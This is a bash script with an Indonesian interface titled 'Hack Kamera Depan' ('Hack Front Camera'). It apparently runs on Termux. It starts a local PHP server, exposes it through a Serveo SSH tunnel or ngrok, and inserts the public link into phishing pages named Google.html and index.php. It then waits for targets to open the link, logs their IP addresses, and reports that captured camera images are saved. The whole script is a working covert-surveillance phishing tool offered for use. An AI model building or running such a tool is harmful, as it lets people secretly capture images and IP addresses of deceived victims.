#!/bin/bash
# Ahmad Khoirul Marzuqin
trap 'printf "\n";stop' 2



banner() {
clear
printf "\033[94m                ╔═══════════════════╗\n"
printf "\033[94m                ║\033[93m Hack Kamera Depan \033[94m║\n"
printf "\033[94m                ╚═══════════════════╝\n"
}



stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}



dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "pkg install php"; exit 1; }
}



catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\033[94m›\033[0m IP : \033[93m%s\n" $ip
cat ip.txt >> saved.ip.txt
}



checkfound() {
printf "\033[94m║\033[92m›\033[94m║\033[91m Untuk Berhenti Tekan Tombol CTRL+C+CTRL+D+Enter\n"
printf "\033[94m║\033[92m›\033[94m║\033[0m Menunggu Target ...\n"
printf "\033[94m╚═╝\033[0m\n\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\033[94m›\033[0m Target Sedang Membuka Link ...\033[0m\n"
catch_ip
rm -rf ip.txt
fi
if [[ -e "Log.log" ]]; then
printf "\033[94m›\033[92m Menyimpan Di Memori Internal (CAM tanggal waktu)\033[0m\n"
rm -rf Log.log
fi
done 
}



server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "pkg install openssh"; exit 1; }
printf "\033[94m║\033[92m›\033[94m║\033[92m Memulai Server Serveo.net ...\033[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 0
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
sleep 0
fi

printf "\033[94m║\033[92m›\033[94m║\033[92m Memulai Server Php ... (Localhost : 3333)\033[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 5
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\033[94m║\033[92m›\033[94m║\033[92m Link\033[0m : \033[96m\033[5m%s\033[0m\n" $send_link
}



payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' irul.html > Google.html
sed 's+forwarding_link+'$link'+g' iindex.php > index.php
}



ngrok_server() {
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "pkg install unzip"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "pkg install wget"; exit 1; }
printf "\n\033[94m›\033[93mMendownload Ngrok ...\033[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\033[94m›\033[91mDownload Error\033[0m\n"
exit 1
fi
else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\033[94m›\033[91mDownload Error\033[0m\n"
exit 1
fi
fi
fi

printf "\033[94m║\033[92m›\033[94m║\033[92m Memulai Server Php ... (Localhost : 3333)\033[0m\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 5
printf "\033[94m║\033[92m›\033[94m║\033[92m Memulai Server Ngrok ...\033[0m\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\033[94m║\033[92m›\033[94m║\033[92m Link\033[0m : \033[96m\033[5m%s\033[0m\n" $link
payload_ngrok
checkfound
}



start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\033[94m╔══╗\n"
printf "\033[94m║\033[0mNo\033[94m║\033[96m Menu Yang Tersedia :\n"
printf "\033[94m║  ║\n"
printf "\033[94m║\033[92m01\033[94m║\033[92m Serveo.net\n"
printf "\033[94m║\033[93m02\033[94m║\033[93m Ngrok\n"
printf "\033[94m║\033[0m99\033[94m║\033[0m Kembali\n"
printf "\033[94m╚══╝\n\n"
default_option_server="1"
read -p $'\033[0m›\033[92m›\033[93m›\033[91m›\033[96m Pilih Nomor : \033[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then
command -v php > /dev/null 2>&1 || { echo >&2 "pkg install php"; exit 1; }
start
elif [[ $option_server -eq 2 ]]; then
ngrok_server
elif [[ $option_server -eq 99 ]]; then
exit 1
else
printf "\n\033[91m!!! Nomor Yang Anda Masukkan Salah !!!\n"
termux-tts-speak Nomor Yang Anda Masukkan Salah
printf "\033[91m!!! Silahkan Hubungi Pembuat Script Ini !!!\033[0m\n"
termux-tts-speak Silahkan Hubungi Pembuat Script Ini
# Ahmad Khoirul Marzuqin
clear
banner
start1
fi
}



payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' irul.html > Google.html
sed 's+forwarding_link+'$send_link'+g' iindex.php > index.php
}



start() {
default_choose_sub="Y"
default_subdomain="irul$RANDOM"
printf "\n\033[94m╔═╗\n"
printf "\033[94m║\033[92m›\033[94m║\033[93m Membuat Subdomain \033[94m[\033[92mY\033[0m/\033[91mn\033[94m]\033[0m : "
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"

if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf "\033[94m║\033[92m›\033[94m║\033[92m Contoh Subdomain\033[0m : %s\n" $default_subdomain
printf "\033[94m║\033[92m›\033[94m║\033[93m Subdomain\033[0m : "
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound
}



banner
dependencies
start1